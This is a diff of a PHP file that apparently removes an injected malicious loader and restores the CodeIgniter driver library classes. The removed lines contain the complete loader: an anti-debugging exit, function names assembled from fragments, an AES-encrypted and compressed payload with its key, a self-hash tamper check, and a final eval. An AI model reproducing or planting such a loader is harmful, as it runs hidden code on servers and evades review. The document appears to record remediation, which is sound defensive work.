@@ -1,28 +1,307 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_f4atb6hy=('bas'.'e64'.'_de'.'cod'.'e');
-$_muhzki7w=('gzu'.'nco'.'mpr'.'ess');
-$_lcfxsg4j=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_uhk3m6wv='mGxQxTbmqow=';
-$_v0mwzhv0='tDpTYodR';
-$_vq228yyq='YOD2hC7I';
-$_no2st1ms='0MPxsj4F';
-$_roesi3yq='7hU6dDfB';
-$_u4is1040='8xuPow==';
-$_v38s6n22='8L0jMnsL';
-$_lk9z94f5='E7mS41uT';
-$_ghjvxn4l=$_f4atb6hy($_roesi3yq.$_no2st1ms.$_vq228yyq.$_v0mwzhv0.$_uhk3m6wv);
-$_ril5lf9o=$_f4atb6hy($_lk9z94f5.$_v38s6n22.$_u4is1040);
-$_onxqocc4=$_f4atb6hy('Tgp0SQ7orX0/W6Iw8IiSKTZkI1cjZ7jNRQKqZBE3eKqzhmArTfL8dkHSmianNm5OJebDucWQa83FB8m3hRCPckKn2jRfSovFqI2LecNeivpkS2LHvjt9Nlx4ILbf7lJVF+8hMsIEksh/KmLAGiY8kGHkESS5ia1yVXVKh8aZAPz1uyd5n3/NQHAfjEZaPePIM/95FT09BWzBUtoZiVL6AGcZAjzHWHt2Lbstjec6S7sHDYFfJb+I2IBR/ASHXeqhuRQMPFYwIFAPyVo6VafcvjunSBWenPTyX9r4pSrP/d8ZU6QBijIsN8PMQ2NYFDhlrjDAAlDcNTOfrIldieNwjPfN5oSZg74TxEhQP6FTOiPJUs8ovScRks40LoWX0Cqs+mbg5qMfqz1ABJ4u1gAmFnecNV8+IDIJOljsHZPzJxUtQ3gYHyAp0MPFTHh23dfdNBfAeNU+UCw5g+l9Hjgc1E7SkWfgNmxkfPYpV7sC3Ua8d28gaZvKUryb4kwODqwoB04BuxFnqz3Mrnwjv7Q3TODodYNSuJdGouSws4TIq5DExIRb8pe/qMNqHZudmuYw0Kt69p8Su1taeErYMGJgjak/PDJsWxuKVXwJhVt8++aQWsRHTbneIYWrZ6LhFPpE2nIDJopk5jlCkyA9QcEmzgdXQVQpbWeei3Q9rxlvZOkLUJ0xE1BS+e2B3uHzOPaqvLXU8pDXy2reFlWwXv++5ZId6m1No6eBApjiKjE+kZ3EALsyy0H5JvTEfXszi0IIa3IZTd7ZPqkZvM3q3LJrKenbccrPCzzFfC5qkwZDLufMpdZvK4ezWbg1sd4+2NrTPZUl8iWneEXfguTTrNmsvRXmgfP6yvWwiM1qiWQZyjRpOce5qjU/gsUjaGoFrKtHy5IrWmZUSmK4CKTLm8+yvHmNRnlxzXPKiKgYTXwbyT5/8UeJ4EhdH0Mcfbcczc2QluJdBSDwK2gAksdnQQ/dFcu1VWeyqmyWRr87cx0zz/Ku61uzSymhhtG8jGkGX1XZ3KaNlcnWS6MPvZahJ3JEbZ9T94St7EJrC0Q3EqVPO1onDid7cjZRJpLkPPN5yRXkbgRJOSh27rNTgnKpP2BjFn/8ZXsS2ITfVx1xANzCIwp6yqytKFKULsBOJkfGi/u9Iz3oikntV43Iw49ZUvs+qOqA+QkRggbwcyKZKBli10rYH5TxeF76vg2ehHE6EZx2JPsCRy0J93dCiTH3/MgRgb2VJS7aXG0X21Ng23QooBm5ZQfOoK8np9ivZZPR3eFenNnfcRK/IiYkzNopW2t5mg==');
-$_lxiczcr2=$_lcfxsg4j($_onxqocc4,'aes-256-cbc',$_ghjvxn4l,OPENSSL_RAW_DATA,$_ril5lf9o);
-if($_lxiczcr2===false){exit;}
-$_borvkaha=$_muhzki7w($_lxiczcr2);
-if($_borvkaha===false){exit;}
-$_wlkpzht5='b076cd0f7616b4af4a2ee6ff2e8725ed7df141690fcfc6217f166dc308af400d';
-$_ksj930rz=@file_get_contents(__FILE__);
-if($_ksj930rz!==false){
-$_uopteyvr=str_replace($_wlkpzht5,"0000000000000000000000000000000000000000000000000000000000000000",$_ksj930rz);
-$_s1lq5gls=hash("sha256",$_uopteyvr);
-if($_s1lq5gls!==$_wlkpzht5){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_Driver_Library {
+
+
+
+
+
+protected $valid_drivers = array();
+
+
+
+
+
+protected $lib_name;
+
+
+
+
+
+
+
+
+
+public function __get($child)
+{
+
+return $this->load_driver($child);
 }
-eval($_borvkaha);
+
+
+
+
+
+
+
+
+public function load_driver($child)
+{
+
+$prefix = config_item('subclass_prefix');
+if ( ! isset($this->lib_name))
+{
+
+$this->lib_name = str_replace(array('CI_', $prefix), '', get_class($this));
+}
+
+$child_name = $this->lib_name.'_'.$child;
+
+if ( ! in_array($child, $this->valid_drivers))
+{
+
+$msg = 'Invalid driver requested: '.$child_name;
+log_message('error', $msg);
+show_error($msg);
+}
+
+$CI = get_instance();
+$paths = $CI->load->get_package_paths(TRUE);
+
+$class_name = $prefix.$child_name;
+$found = class_exists($class_name, FALSE);
+if ( ! $found)
+{
+
+foreach ($paths as $path)
+{
+
+$file = $path.'libraries/'.$this->lib_name.'/drivers/'.$prefix.$child_name.'.php';
+if (file_exists($file))
+{
+
+$basepath = BASEPATH.'libraries/'.$this->lib_name.'/drivers/'.$child_name.'.php';
+if ( ! file_exists($basepath))
+{
+$msg = 'Unable to load the requested class: CI_'.$child_name;
+log_message('error', $msg);
+show_error($msg);
+}
+
+include_once($basepath);
+include_once($file);
+$found = TRUE;
+break;
+}
+}
+}
+
+if ( ! $found)
+{
+
+$class_name = 'CI_'.$child_name;
+if ( ! class_exists($class_name, FALSE))
+{
+
+foreach ($paths as $path)
+{
+
+$file = $path.'libraries/'.$this->lib_name.'/drivers/'.$child_name.'.php';
+if (file_exists($file))
+{
+
+include_once($file);
+break;
+}
+}
+}
+}
+
+if ( ! class_exists($class_name, FALSE))
+{
+if (class_exists($child_name, FALSE))
+{
+$class_name = $child_name;
+}
+else
+{
+$msg = 'Unable to load the requested driver: '.$class_name;
+log_message('error', $msg);
+show_error($msg);
+}
+}
+
+$obj = new $class_name();
+$obj->decorate($this);
+$this->$child = $obj;
+return $this->$child;
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_Driver {
+
+
+
+
+
+protected $_parent;
+
+
+
+
+
+protected $_methods = array();
+
+
+
+
+
+protected $_properties = array();
+
+
+
+
+
+
+protected static $_reflections = array();
+
+
+
+
+
+
+
+
+public function decorate($parent)
+{
+$this->_parent = $parent;
+
+
+$class_name = get_class($parent);
+if ( ! isset(self::$_reflections[$class_name]))
+{
+$r = new ReflectionObject($parent);
+foreach ($r->getMethods() as $method)
+{
+if ($method->isPublic())
+{
+$this->_methods[] = $method->getName();
+}
+}
+foreach ($r->getProperties() as $prop)
+{
+if ($prop->isPublic())
+{
+$this->_properties[] = $prop->getName();
+}
+}
+self::$_reflections[$class_name] = array($this->_methods, $this->_properties);
+}
+else
+{
+list($this->_methods, $this->_properties) = self::$_reflections[$class_name];
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function __call($method, $args = array())
+{
+if (in_array($method, $this->_methods))
+{
+return call_user_func_array(array($this->_parent, $method), $args);
+}
+throw new BadMethodCallException('No such method: '.$method.'()');
+}
+
+
+
+
+
+
+
+
+
+public function __get($var)
+{
+if (in_array($var, $this->_properties))
+{
+return $this->_parent->$var;
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function __set($var, $val)
+{
+if (in_array($var, $this->_properties))
+{
+$this->_parent->$var = $val;
+}
+}
+}
